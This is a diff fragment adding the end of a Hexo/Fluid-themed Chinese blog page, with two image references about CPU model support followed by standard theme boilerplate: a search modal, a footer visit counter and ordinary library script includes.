+<p><img src="D:%5CTypora%5Cimgs%5Cimage-20250719225328916.png" srcset="/img/loading.gif" lazyload alt="image-20250719225328916"></p>
+<p>2、cpu型号支持</p>
+<p><img src="D:%5CTypora%5Cimgs%5Cimage-20250719225437883.png" srcset="/img/loading.gif" lazyload alt="image-20250719225437883"></p>
+
+
+  
+
+</article>
+
+
+
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
